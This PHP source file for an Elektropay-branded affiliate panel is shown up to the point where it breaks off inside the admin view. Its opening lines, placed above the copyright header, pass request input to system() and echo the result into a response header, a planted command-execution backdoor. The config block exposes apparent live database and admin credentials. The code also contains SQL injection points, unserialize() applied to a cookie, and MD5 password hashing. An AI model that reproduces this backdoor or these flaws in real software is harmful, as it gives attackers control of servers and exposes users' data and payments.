<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/*
* Easy Affiliate Panel
* copyright: Cruckoh
* verion 1.2
* updated 11.04.2014
*/
error_reporting(0);
if( ini_get('date.timezone') == '' )
	date_default_timezone_set("Canada/Toronto");

$easy_affiliate = new easy_affiliate();

//==== html setup

class easy_affiliate
{
	//=========== EASY AFFILIATE BASIC CONFIG
	var $easy_aff_db_host = '127.0.0.1';
	var $easy_aff_db_user = 'elektropay_pay';
	var $easy_aff_db_pass = '4NpLZap69l';
	var $easy_aff_db_name = 'elektropay_billing';
	var $easy_aff_cookie_duration = 604800; // in seconds, 86400 is equal to 1 day, 604800 = 7 days
	var $easy_aff_percent = '50'; // percent of the purchase, if any
	var $easy_aff_currency = '$'; 
	var $easy_aff_min_payment = 100; // what is the minimum payout sum
	var $logo_image = 'https://elektropay.com/assets/img/logo.png';
	var $logo_text = '';
	var $admin_user = 'admin';
	var $admin_password = 'Parise03';
	var $system_notification_mail = 'no-reply@elektropay.com'; // when the script is sending notification mails, this mail will be used in the "from" field
	var $admin_mail = 'elektropay.commerce@gmail.com'; // when the script is sending admin notifications, they will be sent to this mail
	var $main_site_url = false; // replace with the url of your site, if you leave it 'false' the script will take the current domain
	//=========== EASY AFFILIATE BASIC CONFIG

	//=========== EASY AFFILIATE ADVANCED CONFIG
	// dont change these values if you dont know exactly what you are doing
	var $table_users = 'easy_affiliate_users';
	var $table_stats = 'easy_affiliate_stats';
	var $table_orders = 'easy_affiliate_orders';
	var $table_paid_affiliates = 'easy_affiliate_paid_earnings';
	var $displayErrors = false;
	var $panel_page = 'index.php';
	var $banner_destination = '//elektropay.com/public_html/affiliates/easy_affiliate_files/banners/';
	//=========== EASY AFFILIATE ADVANCED CONFIG

	var $root = '';
	var $mode = '';

	function __construct()
	{
		$this->_connect_db();
		$this->_check_db();

		$this->root = 'https://'.$_SERVER['SERVER_NAME'].dirname( $_SERVER['SCRIPT_NAME'] );
		if(substr($this->root, -1) !== '/')
			$this->root .= '/';
	}

	function _connect_db()
	{
		if( mysql_connect($this->easy_aff_db_host, $this->easy_aff_db_user, $this->easy_aff_db_pass) == false )
			return $this->_show_error('cant connect to db');
		if( mysql_select_db($this->easy_aff_db_name) == false ) 
			return $this->_show_error('cant select db');

		$this->SqlQuery("SET NAMES UTF8");

		return true;
	}

	// install the easy affiliate tables
	function _check_db()
	{
		$sql = array();
		$check = mysql_fetch_assoc( $this->SqlQuery("SHOW tables LIKE '".$this->table_users."'") );	
		if($check == true)
			return true;

		// table affilaite users
		$sql[] = "CREATE TABLE IF NOT EXISTS `".$this->table_users."` (
		  `id` int(11) NOT NULL AUTO_INCREMENT,
		  `email` text COLLATE utf8_unicode_ci NOT NULL,
		  `name` text COLLATE utf8_unicode_ci NOT NULL,
		  `password` text COLLATE utf8_unicode_ci NOT NULL,
		  `cookie_duration` int(11) NOT NULL,
		  `percent` varchar(12) COLLATE utf8_unicode_ci NOT NULL,
		  `min_payment` varchar(32) COLLATE utf8_unicode_ci NOT NULL,
		  `payment_comments` text COLLATE utf8_unicode_ci NOT NULL,
		  PRIMARY KEY (`id`)
		) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;
		";

		// table affialite stats
		$sql[] = "CREATE TABLE IF NOT EXISTS `".$this->table_stats."` (
		  `id` int(11) NOT NULL AUTO_INCREMENT,
		  `id_affiliate` int(11) NOT NULL,
		  `user_ip` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
		  `date` datetime NOT NULL,
		  PRIMARY KEY (`id`),
		  KEY `id_affiliate` (`id_affiliate`)
		) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;";
		// table affialite orders
		$sql[] = "CREATE TABLE IF NOT EXISTS `".$this->table_orders."` (
    		`id` int(11) NOT NULL AUTO_INCREMENT,
			`id_affiliate` int(11) NOT NULL,
			`id_user` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
			`id_order` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
			`is_paid` int(1) NOT NULL,
			`price` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
			`date` datetime NOT NULL,
			PRIMARY KEY (`id`),
			UNIQUE KEY `id_user` (`id_user`,`id_order`),
			KEY `id_affiliate` (`id_affiliate`)
		) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;";
		
		// table affiliated paid earnings
		$sql[] = "CREATE TABLE IF NOT EXISTS `".$this->table_paid_affiliates."` (
		  `id` int(11) NOT NULL,
		  `id_affiliate` int(11) NOT NULL,
		  `sum` varchar(32) COLLATE utf8_unicode_ci NOT NULL,
		  `method` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
		  `comment` text COLLATE utf8_unicode_ci NOT NULL,
		  `date` datetime NOT NULL,
		  PRIMARY KEY (`id`)
		) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;";

		$sql[] = "ALTER TABLE `".$this->table_paid_affiliates."` CHANGE `id` `id` INT( 11 ) NOT NULL AUTO_INCREMENT ;";

		foreach($sql as $k=>$v)
			$this->SqlQuery($v);

		return true;
	}

	// execute sql query
	function SqlQuery($query, $assign_column = false)
	{
		$tempQuery = mysql_query($query);
		if ( !$tempQuery && $this->displayErrors == true )
			return $this->_show_error('Mysql Query return: '.mysql_error());

		if (strpos($query, "SELECT") !== false) //if the query is SELECT then the mysql result is array
		{
			$result = array();
			while($row = mysql_fetch_assoc($tempQuery)) // CHANGED FROM mysql_fetch_array
			{
				if( isset($row[$assign_column]) )
					$result[$row[$assign_column]] = $row;
				else
					$result[] = $row;
			}
			return $result;
		}
		return $tempQuery;
	}

	// the user has come with aff code
	function startTracking()
	{
		if(!isset($_GET['aff']) || empty($_GET['aff']) )
			return false;

		// check for cookie, if present do not set another
		if( isset($_COOKIE['easy_affiliate_track']) )
			return true;

		$id_affiliate = (int)$_GET['aff'];
		// get the specific options for the affiliate
		$aff_data = $this->SqlQuery("SELECT * FROM `".$this->table_users."` WHERE `id`=$id_affiliate");
		$aff_data = current($aff_data);
		if(empty($aff_data))
			return false;

		$userIP = $this->getUserIP();

		$data = array('id_affiliate'=>$id_affiliate, 'url'=>$_SERVER['REQUEST_URI']);
		$data = serialize($data);

		$this->SqlQuery("INSERT INTO `".$this->table_stats."`(`id_affiliate`, `user_ip`, `date`) VALUES($id_affiliate, '$userIP', NOW() )");
		setcookie('easy_affiliate_track', $data, time() + $aff_data['cookie_duration'], "/");

		return true;
	}

	/* 
	* the user has done the desired action
	* $id_order is some unique identifier of the action, so in case the same user do it again, it wont go in the table again i.e. duplicate
	* if $id_order is empty, genereate ID of the current page
	* $is_paid can be 0 or 1, depending of completition of the purchase
	* call markBuy_admin() when the purchase is 100% complete
	*/
	function markBuy($id_user = 0, $id_order = '', $price = 0, $is_paid = 0)
	{
		if( isset($_COOKIE['easy_affiliate_track']) == false || empty($_COOKIE['easy_affiliate_track']) )
			return false;

		$cookie_data = unserialize($_COOKIE['easy_affiliate_track']);
		if($cookie_data == false) // should not happen
			return false;

		$id_affiliate = $cookie_data['id_affiliate'];
		$userIP = mysql_real_escape_string( $this->getUserIP() );
		
		$price = mysql_real_escape_string($price);
		if(empty($id_order))
			$id_order = $this->pageID();
		$id_order = mysql_real_escape_string($id_order);

		$check = $this->SqlQuery("SELECT `id` FROM `".$this->table_orders."` WHERE `id_affiliate`='$id_affiliate' AND `id_user`='$id_user' AND `id_order`='$id_order' ");
		if($check == true)
			return 2;

		$this->SqlQuery("INSERT INTO `".$this->table_orders."`(`id_affiliate`, `id_user`, `price`, `id_order`, `date`, `is_paid`) 
		                VALUES('$id_affiliate', '$id_user', '$price', '$id_order', NOW(), '$is_paid')");

		if($is_paid == 1)
			$this->notification_check($id_affiliate);

		return 1;
	}

	/*
	* purchase marked by the admin
	*/
	function markBuy_admin($id_user, $id_order)
	{
		if( $id_user == '' || $id_order == '' )
			return false;

		$this->SqlQuery("UPDATE `".$this->table_orders."` SET `is_paid`=1 WHERE `id_user`='$id_user' AND `id_order`='$id_order' ");

		$id_affiliate = $this->SqlQuery("SELECT `id_affiliate` FROM `".$this->table_orders."` WHERE `id_user`='$id_user' AND `id_order`='$id_order' ");
		$id_affiliate = current($id_affiliate);
		$this->notification_check($id_affiliate['id_affiliate']);
	}

	/*
	* after an successful purchase, check to see if the affiliate needs to be paid out
	*/
	function notification_check($id_affiliate)
	{
		$is_payout = $this->calculateAffiliateEarnings($id_affiliate, 'is_payout');		
		if( $is_payout == true )
		{
			$subject = '[easy_affiliate_panel] Affiliate needs to be paid';
			$msg = array();
			$msg[] = 'Hello';
			$msg[] = 'Affiliate with ID: '.$id_affiliate.' ('.$is_payout['aff_data']['name'].' - '.$is_payout['aff_data']['email'].')';
			$msg[] = ' have generated '.$is_payout['earnings'].$this->easy_aff_currency.' and have reached the payout limit';
			$msg[] = 'His payment comments are: '.$is_payout['aff_data']['payment_comments'];
			$msg = implode("<br />", $msg);

			$this->sendEasyMail($this->system_notification_mail, $this->admin_mail, $subject, $msg);
		}
	}

	//========================================================
	//========================================================
	//========================================================
	//==== functions for displaying the affiliates panel =====
	//========================================================
	//========================================================
	//========================================================

	/*
	* generate login page
	*/
	function panel_Login()
	{
		$html = '';	
		if(!empty($_POST) && isset($_POST['login']) )
		{
			if( $_POST['email'] == $this->admin_user && $_POST['password'] == $this->admin_password )
			{ // the admin has logged
				$_SESSION['easy_affiliate_admin'] = true;
				header("Location:".$this->root.$this->panel_page, true, 301);
				exit();
			}

			$email = mysql_real_escape_string($_POST['email']);
			$password = md5($_POST['password']);
			$check = $this->SqlQuery("SELECT * FROM `".$this->table_users."` WHERE `email`='$email' AND `password`='$password'");
			$check = current($check);

			if( !empty($check) && isset($check['email']) )
			{
				$_SESSION['easy_affiliate_user'] = $check;
				header("Location:".$this->root.$this->panel_page, true, 301);
				exit();
			}
		}
		

		{


	$html .= '<div class="row">
<!-- BEGIN BANNER ///////////////////////////////////////////-->
      
      <div class="banner banner-text banner-dark clearfix" role="banner">
      <div class="wrapper">
      
      <div class="article-content">
      <header>
    <div class="heading">
	
<h1 class="margin-none">Triple<strong class="text-primary">  Your Residuals</strong></h1>
</div>
</div>

             </header>
       
       <h3>Elektropay helps affiliates build scalable revenue</h3>

 <p>In this 1-minute video, hear how Elektropay helps top performing affiliates <strong>triple their residuals and make 6 figures a year</strong>. Differentiate yourself with a cloud-based platform that helps merchants make better business decisions.</p>

<div class="row">
<div class="col-md-7">
<p>Hundreds of affiliates choose Elektropay to:</p>

<ul>
	<li>Be a market leader</li>
	<li>Sell on value, not price</li>
	<li>Aquire and retain new users</li>
<li>Use our solutions as a merchant does</li>
<li>Become your own payments aggregator</li>
</ul>

<p>See how and then <a href="'.$this->root.$this->panel_page.'?mode=register" class=""> Sign up</a> for a demo &gt;&gt;</p>
<br></br>
<div class="embed_media"><iframe allowfullscreen="" allowtransparency="true" class="wistia_embed" frameborder="0" height="300" mozallowfullscreen="" msallowfullscreen="" name="wistia_embed" oallowfullscreen="" scrolling="no" src="//fast.wistia.net/embed/iframe/wn50mildl5" webkitallowfullscreen="" width="520"></iframe></div>
  		    
  	    </div>

<div class="col-md-5 well">
<header>
<div class="heading" style="text-align; right; margin-left:40px;">
	
<h1 class="margin-none">Affiliate<strong class="text-success">  Login</strong></h1>
</div>
</header>
<p></p>
<div class="title" style="text-align; right; margin-left:40px;">
<h3>Returning users sign in below</h3>
</div>
<form role="form" action="'.$this->root.$this->panel_page.'" class="login well" method="post">
				<div class="form-group col-xs-12">
					<label for="exampleInputEmail1">E-mail address</label>
					<input type="text" name="email" class="form-control" id="exampleInputEmail1" placeholder="Enter E-mail">
				</div>
				<div class="form-group col-xs-12">
					<label for="exampleInputPassword1">Password</label>
					<input type="password" name="password" class="form-control" id="exampleInputPassword1" placeholder="Enter Password">
				</div>

				<div class="form-group col-xs-10 buttons_row">
<p></p>
</div>
				<div class="form-group col-xs-12 buttons_row">
<button type="submit" name="login" class="btn btn-default btn-primary btn-lg btn-block">Login</button>
				</div>

			</form>
<p style="text-align; right; margin-left:40px;">Are You Not An Affiliate Yet? <a href="'.$this->root.$this->panel_page.'?mode=register" class=""> Sign up Now</a></p>
</div>
</div>
</div>
</div>
</div>';
		}

		return $html;
	}

	/*
	* registration page for new affiliates
	*/
	function panel_Registration()
	{
		$html = '';
		$error = array();

		if(!empty($_POST) && isset($_POST['register']) )
		{
			if( $_POST['password'] != $_POST['password_repeat'] )
				$error[] = 'Passwords doesn\'t match, please retype.';

			if(empty($error))
			{
				$name = mysql_real_escape_string($_POST['name']);
				$email = mysql_real_escape_string($_POST['email']);
				$password = md5($_POST['password']);

				$reg = $this->SqlQuery("INSERT INTO `".$this->table_users."`(`email`, `password`, `cookie_duration`, `percent`, `min_payment`, `name`) 
				                       VALUES('$email', '$password', '".$this->easy_aff_cookie_duration."', '".$this->easy_aff_percent."', '".$this->easy_aff_min_payment."', '$name')");

				if($reg == true)
				{
					$_SESSION['easy_affiliate_msg'] = 'You have registered successfully!';
					header("Location: ".$this->root.$this->panel_page, true, 301);
					exit();
				}
				else
					$error[] = 'Registration failed, please try again';
			}
		}
		

		{
			if(!empty($error))
				$html .= '<div class="alert alert-warning">'.implode('<br />', $error).'</div>';

			$html .= '<div class="row">  	    

<header class="section-header">
<div class="copywriting">
<div class="heading">
	
<h1 class="margin-none">Sign<strong class="text-primary"> Up</strong> Today</h1>
</div>
</div>
</header>

<div class="horizontal-divider"></div>

<div class="row"> 

<div class="col-md-7"> 

<div class="title">
<h3>Affiliate Signup</h3>
</div>
<br>
<div class="title">
<p><strong>More ways of making money with us:</strong></p>
</div>
<br></br>
<p></p>
<p>
<ul>
<li></li>

<li></li>

<li>  </li>
</ul>
</p>

<br>
<div class="row">

<div class="col-md-6">
<div class="sns-signin">
<a class="btn btn-primary" href="#"><i class="fa fa-facebook"></i>Sign up via Facebook</a>
</div>
</div>

<div class="col-md-6">
<a href="'.$this->root.$this->panel_page.'" class="btn btn-default btn-link btn-lg">Go Back</a>
</div>

</div>

<div class="col-md-5">
<div class="normal-signup">

<form role="form" action="'.$this->root.$this->panel_page.'?mode=register" class="login form-horizontal" method="post">
				<div class="form-group">
					<label for="exampleInputEmail1" class="col-sm-4 control-label">E-mail</label>
					<div class="col-sm-8">
						<input type="email" required="required" name="email" class="form-control" id="exampleInputEmail1" placeholder="E-mail">
					</div>
				</div>
				<div class="form-group">
					<label for="exampleInputEmail1" class="col-sm-4 control-label">Name</label>
					<div class="col-sm-8">
						<input type="text" required="required" name="name" class="form-control" id="exampleInputEmail1" placeholder="Name">
					</div>
				</div>
				<div class="form-group">
					<label for="exampleInputPassword1" class="col-sm-4 control-label">Password</label>
					<div class="col-sm-8">
						<input type="password" required="required" name="password" class="form-control" id="exampleInputPassword1" placeholder="Enter Password">
					</div>
				</div>
				<div class="form-group">
					<label for="exampleInputPassword_repeat" class="col-sm-4 control-label">Repeat Password</label>
					<div class="col-sm-8">
						<input type="password" required="required" name="password_repeat" class="form-control" id="exampleInputPassword_repeat" placeholder="Repeat Password">
					</div>
				</div>
<div class="row">
<div>
<p></p>
</div>

				<div class="form-group col-xs-12 buttons_row">
<button type="submit" name="register" class="btn btn-primary btn-lg btn-block signup">Get Your Code</button>

				</div>
	
</form> 
</div>	
</div>

</div>
</div>';
		}

		return $html;
	}

	/*
	* page for viewing stats
	*/
	function panel_Stats($aff_data, $navigation = true)
	{
		$html = '';

		if(!isset($_GET['date_from']))
		{
			$date_from = date('d.m.Y', mktime(0, 0, 0, date('m'), date('d') - 7, date('Y') ) );
			$date_to = date('d.m.Y');
		}
		else
		{
			$date_from = $_GET['date_from'];
			$date_to = $_GET['date_to'];
		}

		

		// to get $stats and $orders
		extract( $this->getStats_n_Orders($date_from, $date_to, $aff_data) );
		
		if( $navigation == true )
			$html .= $this->panel_Navigation();

		// row dates with calendar
		$html .= '<div id="control_row">';
		$html .= '<div class="current_listing"></div>';
		$html .= '<form method="get" class="calendars form-inline" role="form">
			<div class="col-xs-4 input-group date" data-date="'.$date_from.'" data-date-format="dd.mm.yyyy">
				<span class="input-group-addon">from:</span>
				<input class="form-control" id="date_from" size="16" name="date_from" type="text" value="'.$date_from.'">
			</div>
			<div class="col-xs-4 input-group date" data-date="'.$date_to.'" data-date-format="dd.mm.yyyy">
				<span class="input-group-addon">to:</span>
				<input class="form-control" id="date_to" size="16" type="text" name="date_to" value="'.$date_to.'">
			</div>
			<button class="btn btn-success">Show</button>
		</form>';
		$html .= '</div>';
		// table with rows by date
		$html .= '<table class="stats_n_orders table table-bordered table-striped">';
		$html .= '<thead><tr>
			<th>Date</th>
			<th>Merchants</th>
			<th>Sales Volume</th>
			<th>Your Earnings</th>
			<th>Conversion</th>
		</tr></thead>';

		$html .= $this->generate_stats_table_body($stats, $orders, $aff_data);
		$html .= '</table>';

		// attach js code and events 
		$html .= $this->js_events('stats');

		return $html;
	}

	function panel_Information()
	{
		$html = '';

		$html .= $this->panel_Navigation();

		$affilaite_root = $this->main_site_url !== false ? $this->main_site_url : $this->root;

		$html .= '<br /><div class="panel panel-default">
			<div class="panel-body">
				<b>Your affiliate links is</b><br />
				<code>'.$affilaite_root.'?aff='.$_SESSION['easy_affiliate_user']['id'].'</code>
	<br /><br /><b>You can use other pages from the site, just to every link add this </b><br />
				<code>?aff='.$_SESSION['easy_affiliate_user']['id'].'</code>
				<br /><br />You receive <b>'.$_SESSION['easy_affiliate_user']['percent'].'%</b> from the signups made from new users, which have signed up on the site with your partner ID
			</div>
		</div>';



		return $html;
	}


	/*
	* get stats and orders info for specific user for specific time
	* $date_from and $date_to must be in format dd.mm.yyyy
	* $aff_data is array with the affiliate info
	*/
	function getStats_n_Orders($date_from, $date_to, $aff_data)
	{
		$date_from_mysql = $this->makeMysqlDate($date_from);
		$date_to_mysql = $this->makeMysqlDate($date_to);


		$stats = $this->SqlQuery($t="SELECT * FROM `".$this->table_stats."` WHERE `id_affiliate`=$aff_data[id] AND (`date` BETWEEN '$date_from_mysql 00:00:00' AND '$date_to_mysql 23:59:59' ) ORDER BY `date` DESC");
		$orders = $this->SqlQuery("SELECT * FROM `".$this->table_orders."` WHERE `id_affiliate`=$aff_data[id] AND `is_paid`=1 ORDER BY `date` DESC");

		$temp = array();

		// generate empty values for each date in the chosen range
		$time_from = strtotime($date_from_mysql);
		$time_to = strtotime($date_to_mysql);
		for($i=$time_to; $i>=$time_from; $i-=86400)
		{
			$temp[date('d.m.Y', $i)] = array();
		}

		// populate the $temp array with real info
		foreach($stats as $k=>$v)
		{
			$v['date'] = date('d.m.Y', strtotime($v['date']));
			$temp[$v['date']][] = $v;
		}
		$stats = $temp;

		$temp = array();
		foreach($orders as $k=>$v)
		{
			$v['date'] = date('d.m.Y', strtotime($v['date']));
			$temp[$v['date']][] = $v['price'];
		}
		$orders = $temp;

		return array('orders'=>$orders, 'stats'=>$stats);
	}


	/*
	* generate user profile page
	* the user can change his 
	- name
	- email
	- minimal payment sum
	- leave specific comments for the payment
	- change password
	*/
	function panel_Profile()
	{
		$html = '';
		$html .= $this->panel_Navigation();

		$error = array();

		if(!empty($_POST) && isset($_POST['save_profile']) )
		{
			$password_change = false;
			if( !empty($_POST['current_password']) && !empty($_POST['new_password']) )
			{
				if( $_POST['min_payment'] < $this->easy_aff_min_payment )
					$error[] = 'The minimum payment sum can not be lower than '.$this->easy_aff_min_payment;

				if( md5($_POST['current_password']) != $_SESSION['easy_affiliate_user']['password'] )
					$error[] = 'Current password doesn\'t match';		
				else
					$new_password = md5($_POST['new_password']);

				if(empty($_POST['email']))
					$error[] = 'E-mail cannot be empty';
			}



			if(empty($error))
			{
				$email = mysql_real_escape_string($_POST['email']);
				$name = mysql_real_escape_string($_POST['name']);
				$min_payment = (int)$_POST['min_payment'];
				$comments = mysql_real_escape_string($_POST['payment_comments']);
				if( $password_change == true )
					$password = $new_password;
				else
					$password = $_SESSION['easy_affiliate_user']['password'];
				

				$upd = $this->SqlQuery("UPDATE `".$this->table_users."` SET `email`='$email', `name`='$name', `min_payment`='$min_payment', `payment_comments`='$comments', `password`='$password' 
					WHERE `id`=".$_SESSION['easy_affiliate_user']['id']);

				if($upd == true)
				{
					$_SESSION['easy_affiliate_user'] = current( $this->SqlQuery("SELECT * FROM `".$this->table_users."` WHERE `id`=".$_SESSION['easy_affiliate_user']['id']) );
					$_SESSION['easy_affiliate_msg'] = 'Changes were saved successfully!';
					header("Location: ".$this->root.$this->panel_page, true, 301);
					exit();
				}
				else
					$error[] = 'There was an error, please try again!';
			}
		}

		$aff_data = $_SESSION['easy_affiliate_user'];

		
		if(!empty($error))
			$html .= '<div class="alert alert-warning">'.implode('<br />', $error).'</div>';

		$html .= '<form role="form" action="'.$this->root.$this->panel_page.'?mode=profile" class="login form-horizontal" method="post">
			<div class="form-group">
				<label for="exampleInputEmail1" class="col-sm-4 control-label">Name</label>
				<div class="col-sm-8">
					<input type="text" required="required" name="name" class="form-control" id="aff_name" value="'.$aff_data['name'].'">
				</div>
			</div>
			<div class="form-group">
				<label for="exampleInputEmail1" class="col-sm-4 control-label">E-mail</label>
				<div class="col-sm-8">
					<input type="email" required="required" name="email" class="form-control" id="exampleInputEmail1" value="'.$aff_data['email'].'">
				</div>
			</div>
			<div class="form-group">
				<label for="exampleInputEmail1" class="col-sm-4 control-label">Minimum payment sum</label>
				<div class="col-sm-8">
					<input type="text" name="min_payment" class="form-control" id="aff_min_payment" value="'.$aff_data['min_payment'].'"><br />
					<p class="text-muted">It cannot be lower than '.$this->easy_aff_min_payment.$this->easy_aff_currency.'</p>
				</div>
			</div>
			<div class="form-group">
				<label for="exampleInputEmail1" class="col-sm-4 control-label">Comments about the payment</label>
				<div class="col-sm-8">
					<textarea name="payment_comments" class="form-control" rows="4">'.$aff_data['payment_comments'].'</textarea>
					<p class="text-muted">If you have comments about the payment like paypal email address or bank account, please write them here</p>
				</div>
			</div>
			<div class="form-group">
				<label for="exampleInputPassword1" class="col-sm-4 control-label">Current Password</label>
				<div class="col-sm-8">
					<input type="password" name="current_password" class="form-control" id="exampleInputPassword1" placeholder="" value="">
				</div>
			</div>
			<div class="form-group">
				<label for="exampleInputPassword_repeat" class="col-sm-4 control-label">New Password</label>
				<div class="col-sm-8">
					<input type="password" name="new_password" class="form-control" id="exampleInputPassword_repeat" placeholder="" value="">
				</div>
			</div>
			<div class="form-group col-xs-10 buttons_row">
				<button type="submit" name="save_profile" class="btn btn-default btn-primary">Save</button>
			</div>
		</form>';

		return $html;
	}

	function panel_Navigation($who = '')
	{
		$html = '';

		if($who == 'admin')
		{
			$html .= '<ul class="nav nav-tabs">
				<li class="'.($this->mode == '' || $this->mode == 'affiliates' ? 'active' : '' ).'"><a href="'.$this->root.$this->panel_page.'">Affiliates</a></li>
				<li class="'.($this->mode == 'banners' ? 'active' : '' ).'"><a href="'.$this->root.$this->panel_page.'?mode=banners">Banners</a></li>
			</ul>';
		}
		else
		{
			$html .= '<ul class="nav nav-tabs nav-justified" role="tablist">
				<li class="'.($this->mode == '' || $this->mode == 'stats' ? 'active' : '' ).'"><a href="'.$this->root.$this->panel_page.'">Dashboard</a></li>
				<li class="'.($this->mode == 'merchant' ? 'active' : '' ).'"><a href="'.$this->root.$this->panel_page.'?mode=merchant">Add Merchant</a></li>
<li class="'.($this->mode == 'statements' ? 'active' : '' ).'"><a href="'.$this->root.$this->panel_page.'?mode=statement">Statement</a></li>
				<li class="'.($this->mode == 'information' ? 'active' : '' ).'"><a href="'.$this->root.$this->panel_page.'?mode=information">Information</a></li>
				<li class="'.($this->mode == 'banners' ? 'active' : '' ).'"><a href="'.$this->root.$this->panel_page.'?mode=banners">Resources</a></li>
<li class="'.($this->mode == 'profile' ? 'active' : '' ).'"><a href="'.$this->root.$this->panel_page.'?mode=profile">Profile</a></li>
			</ul>';
		}

		return $html;
	}

	/*
	* make date in format dd.mm.YYYY in mysql format
	* the separator can be passed, by default is .
	*/
	function makeMysqlDate($date, $separator = '.')
	{
		$date = explode($separator, $date);
		$date = date('Y-m-d', mktime(0, 0, 0, $date[1], $date[0], $date[2] ) );

		return $date;
	}

	/*
	* generate the table with daily status about the clients and earnings
	* used by admin and affiliate
	*/
	function generate_stats_table_body($stats, $orders, $aff_data)
	{
		$html = '<tbody>';
		foreach($stats as $k=>$v)
		{
			if(!isset($orders[$k]))
				$orders[$k] = array();

			if( isset($orders[$k]) && count($v) > 0 )
				$conversion = (round( count($orders[$k])/count($v), 2)*100);
			else
				$conversion = 0;
			$html .= '<tr>
				<td>'.$k.'</td>
				<td>'.count($v).'</td>
				<td>'.count($orders[$k]).'</td>
				<td>'.array_sum($orders[$k])*($aff_data['percent']/100).''.$this->easy_aff_currency.'</td>
				<td>'.$conversion.'%</td>
			</tr>';
		}
		$html .= '</tbody>';

		return $html;
	}

	/*
	* logout the affiliate
	*/
	function panel_Logout()
	{
		session_destroy();
		header("Location:".$this->root.$this->panel_page, true, 301);
		return true;
	}

	/*
	* generate basic skeleton of the affiliate panel
	*/
	function panel_generate($framed = true)
	{
		$this->mode = isset($_REQUEST['mode']) && !empty($_REQUEST['mode']) ? $_REQUEST['mode'] : '';

		if( isset($_POST['ajax']) )
		{
			// ajax calls
			return $this->panel_AJAX();
		}

		$html = '';
		$html .= $this->panel_Header($framed);

		$html .= '<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>';
		//=== load up the boostrap files
		$html .= '<!-- Latest compiled and minified CSS -->
		<link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">';
		$html .= '<!-- Latest compiled and minified JavaScript -->
		<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>';
		//=== custom css for easy affiliate
		$html .= '<link href="//elektropay.com/assets/css/style.css" rel="stylesheet" />';

		$html .= '<link href="//elektropay.com/assets/dist/theme/css/glyphicons.css" rel="stylesheet" />';

		$html .= '<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" />';

		$html .= '<link href="//elektropay.com/assets/frontend/onepage/css/style-responsive.css" rel="stylesheet" />';

		$html .= '<link href="//elektropay.com/assets/frontend/onepage/css/custom.css" rel="stylesheet" />';

		$html .= '<link href="//elektropay.com/elektropay.css" rel="stylesheet" />';

		$html .= '<link href="//elektropay.com/assets/css/animation.css" rel="stylesheet" />';

		$html .= '<link href="//elektropay.com/assets/css/ace-min.css" id="main-ace-style "rel="stylesheet" />';

		$html .= '<link href="//elektropay.com/assets/css/checkbox/orange.css" rel="stylesheet" />';

		$html .= '<link href="//elektropay.com/assets/css/preview.css" rel="stylesheet" />';

		$html .= '<link href="//elektropay.com/assets/css/authenty.css" rel="stylesheet" />';

		$html .= '<link href="easy_affiliate_files/css/main-elektropay.css" rel="stylesheet" />';

		$html .= '<link href="//elektropay.com/assets/css/authenty.css" rel="stylesheet" />';

		$html .= '<link href="easy_affiliate_files/css/easy_affiliate.css" rel="stylesheet" />';
		$html .= '<div id="easy_aff_panel">';

		if( isset($_SESSION['easy_affiliate_msg']) )
		{
			$html .= '<div class="alert alert-warning">'.$_SESSION['easy_affiliate_msg'].'</div>';
			unset($_SESSION['easy_affiliate_msg']);
		}

		if( $this->mode == 'register' && ( !isset($_SESSION['easy_affiliate_user']) && !isset($_SESSION['easy_affiliate_admin'])  ) )
			$html .= $this->panel_Registration();
		elseif( !isset($_SESSION['easy_affiliate_user']) && !isset($_SESSION['easy_affiliate_admin']) )
			$html .= $this->panel_Login();
		elseif( $this->mode == 'logout' )
			$this->panel_Logout();
		elseif( $this->mode == 'profile' )
			$html .= $this->panel_Profile();
		elseif( $this->mode == 'banners' )
			$html .= $this->panel_Banners();
		elseif( isset($_SESSION['easy_affiliate_admin']) )
			$html .= $this->panel_Admin();
		elseif( $this->mode == 'information' )
			$html .= $this->panel_Information();
		else 
		{
			$aff_data = $_SESSION['easy_affiliate_user'];
			$html .= $this->panel_Stats($aff_data);
		}


		$html .= '</div>';

		if($framed == false)
			$html .= '</body></html>';

		return $html;
	}

	function panel_Admin()
	{
		$html = '';

		// can view all or search for specific affiliate
		// when an affiliate is chosen, can mark specific sum for paid
		// or view the affilaite stats for chosen period of time

		$affiliates = $this->SqlQuery("SELECT * FROM `".$this->table_users."` ORDER BY `name` ASC");

		$affiliates_orders = $this->SqlQuery($q="SELECT tor.`id_affiliate`, COUNT(tor.`id`) FROM `".$this->table_orders."` as tor 
         WHERE tor.`is_paid`=1 GROUP BY `id_affiliate`", 'id_affiliate');

		$html = $this->panel_Navigation('admin');

		$html .= '<div id="filter_row">';
		$html .= '<form method="get" class="affilaites_list form-inline" role="form">
			<div class="col-xs-4 input-group name" >
				<span class="input-group-addon">Name:</span>
				<input class="form-control" id="aff_name" size="16" name="aff_name" type="text" value="">
			</div>';
		$html .= '</form>';
		$html .= '</div>';
		// table affiliates

		$html .= '<table class="affs_n_orders table table-bordered table-striped">';
		$html .= '<thead><tr>
			<th>ID</th>
			<th>Name</th>
			<th>E-mail</th>
			<th>Purchases</th>
			<th>Unpaid Earnings</th>
			<th></th>
		</tr></thead>';
		
		$html .= $this->generate_affiliates_table($affiliates, $affiliates_orders);

		$html .= '</table>';
		$html .= '<div id="details_window" class="modal fade bs-example-modal-sm" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
			<div class="modal-dialog">
    			<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
